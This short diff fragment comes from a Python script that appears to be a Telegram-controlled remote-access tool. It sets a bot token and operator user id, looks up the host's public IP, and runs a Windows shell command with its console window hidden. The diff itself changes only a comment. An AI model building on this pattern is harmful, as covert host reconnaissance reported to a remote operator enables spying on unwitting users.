@@ -3,7 +3,7 @@ import subprocess
 userId = 12345678 #user id
 import requests
 token =  "bot_token" # 
-response_ip = requests.get('https://api64.ipify.org?format=json').json()  # check connection
+response_ip = requests.get('https://api64.ipify.org?format=json').json()  # get ip info
 ip_address = response_ip["ip"]
 bot = telebot.TeleBot(token)
 code_page = subprocess.check_output('chcp', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode('utf-8', errors='ignore').strip().split(' ')[-1]
